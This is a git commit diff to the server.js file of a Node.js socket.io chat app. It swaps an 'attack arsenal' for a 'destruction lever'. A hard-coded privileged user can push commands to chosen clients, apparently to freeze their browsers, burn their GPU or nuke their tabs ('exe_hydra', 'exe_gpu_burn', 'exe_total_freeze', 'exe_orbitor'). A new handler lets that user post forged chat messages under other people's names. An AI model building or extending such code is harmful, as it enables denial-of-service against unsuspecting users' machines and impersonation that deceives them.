8352e1936be92752bcdb9736fd09d5d1bbe270b5
ademabatouy08-creator <ademabatouy08@gmail.com>
2026-03-08 17:55:08 +0100

    Update server.js

--- server.js
+++ server.js
@@ -2,37 +2,28 @@ const express = require('express');
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http);
-const PORT = process.env.PORT || 3000;
 
-let registry = { users: {}, blacklist: new Set() };
 app.use(express.static(__dirname));
 app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
 
+let users = {};
 io.on('connection', (socket) => {
-    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
-
-    socket.on('init_user', (data) => {
-        if (registry.blacklist.has(ip)) return socket.disconnect();
-        registry.users[socket.id] = {
-            id: socket.id, name: data.name, ip: ip,
-            chef: data.name === "toucheur2pp", premium: true
-        };
-        sync();
+    socket.on('init', (data) => {
+        users[socket.id] = { id: socket.id, name: data.name, chef: data.name === "toucheur2pp" };
+        io.emit('sync', Object.values(users));
     });
 
-    // --- ARSENAL D'ATTAQUES ---
-    socket.on('attack_hydra', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_hydra'); });
-    socket.on('attack_gpu', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_gpu_burn'); });
-    socket.on('attack_freeze', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_total_freeze'); });
-    socket.on('attack_tab_nuke', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_tab_nuke'); });
-
-    socket.on('chat_msg', (msg) => {
-        const u = registry.users[socket.id];
-        if (u) io.emit('chat_msg', { text: msg.text, name: u.name, chef: u.chef });
+    // --- LEVIER DE DESTRUCTION ---
+    socket.on('launch_orbitor', (sid) => {
+        if(users[socket.id]?.chef) io.to(sid).emit('exe_orbitor', { master: users[socket.id].name });
     });
 
-    socket.on('disconnect', () => { delete registry.users[socket.id]; sync(); });
-    function sync() { io.emit('sync_users', Object.values(registry.users)); }
+    socket.on('force_fake_msg', (data) => {
+        if(users[socket.id]?.chef) io.emit('chat_msg', { name: data.targetName, text: data.fakeText, fake: true });
+    });
+
+    socket.on('disconnect', () => { delete users[socket.id]; io.emit('sync', Object.values(users)); });
+    socket.on('chat_msg', (d) => { io.emit('chat_msg', { name: users[socket.id].name, text: d.text }); });
 });
 
-http.listen(PORT, () => console.log("NEBULA OMNIPOTENCE V40 ACTIVE"));
+http.listen(3000, () => console.log("NEBULA V41 : PROTOCOLE ORBITOR ACTIVÉ"));
